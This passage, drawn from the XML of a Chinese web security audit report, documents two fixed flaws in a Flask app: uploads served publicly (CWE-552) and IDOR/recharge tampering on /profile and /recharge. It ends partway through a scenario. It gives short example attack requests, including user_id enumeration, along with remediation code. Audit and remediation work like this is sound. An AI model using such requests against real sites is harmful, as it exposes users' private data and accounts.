            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 10】上传文件目录静态文件暴露（CWE-552）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>static/uploads/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 目录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-552: Files or Directories Accessible to External Parties</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Flask 框架默认将 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/static/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路径映射为静态文件服务目录，该目录下的所有文件均可被匿名用户通过 URL 直接访问。上传的头像文件虽然经过 UUID 重命名（文件名不可猜测），但一旦文件名被泄露（如通过 HTML 源码、Referer 头等），任何人都可以无需登录直接访问这些文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 任何匿名用户可访问上传的文件</w:t>
        <w:br/>
        <w:t>GET /static/uploads/a1b2c3d4e5f6.jpg  -&gt; 返回文件内容</w:t>
        <w:br/>
        <w:t>GET /static/uploads/                  -&gt; （目录列表默认关闭）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 场景 A — 通过页面源码泄露获取文件 URL 后直接访问</w:t>
        <w:br/>
        <w:t># 在 HTML 中查看头像 URL：</w:t>
        <w:br/>
        <w:t>&lt;img src="/static/uploads/a1b2c3d4e5f6.jpg"&gt;</w:t>
        <w:br/>
        <w:t># 攻击者直接访问该 URL 即可获取原始文件</w:t>
        <w:br/>
        <w:br/>
        <w:t># 场景 B — 浏览器 MIME 嗅探攻击</w:t>
        <w:br/>
        <w:t># 攻击者上传一个伪装为 jpg 的 HTML 文件</w:t>
        <w:br/>
        <w:t># 浏览器访问时可能将文件作为 HTML 渲染</w:t>
        <w:br/>
        <w:t># 导致 XSS 攻击</w:t>
        <w:br/>
        <w:br/>
        <w:t># 场景 C — 文件被用于社工或恶意重放</w:t>
        <w:br/>
        <w:t># 用户上传的私人头像照片被攻击者获取后</w:t>
        <w:br/>
        <w:t># 可用于身份伪造、社交工程攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 用户头像隐私泄露</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：用户的头像图片（可能是私人照片）可被任意人获取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• MIME 类型嗅探攻击</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：浏览器可能错误地解析文件内容，导致安全风险</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 文件完整性失效</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：上传目录无防护，任何人可访问存储的所有文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">添加安全 HTTP 响应头，并设置 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>X-Content-Type-Options: nosniff</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 防止 MIME 类型嗅探攻击：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.after_request</w:t>
        <w:br/>
        <w:t>def add_security_headers(response):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """添加安全响应头"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    response.headers["X-Content-Type-Options"] = "nosniff"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">匿名访问 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/static/uploads/{uuid}.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回图片（头像需可显示）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过（头像功能正常）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>浏览器 MIME 嗅探</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>X-Content-Type-Options: nosniff</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已添加</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 11】原有模块越权与充值漏洞（引用）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /profile</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>POST /recharge</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>原有个人中心与充值模块存在完整的水平越权（IDOR）漏洞集合：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/profile</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接口未校验 user_id 归属、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/recharge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接口从表单参数获取 user_id 且未做金额校验、敏感信息明文展示等。这些漏洞在本次审计的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> LFI 攻击链中作为扩大化利用环节存在。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 场景 A — 批量枚举用户隐私</w:t>
        <w:br/>
        <w:t>GET /profile?user_id=1   -&gt; admin 的完整资料（手机号、邮箱、余额）</w:t>
        <w:br/>
        <w:t>GET /profile?user_id=2   -&gt; alice 的完整资料</w:t>
        <w:br/>
        <w:t>GET /profile?user_id=3   -&gt; 新注册用户的完整资料</w:t>
        <w:br/>
        <w:br/>
        <w:t># 场景 B — 篡改任意账户余额</w:t>
        <w:br/>
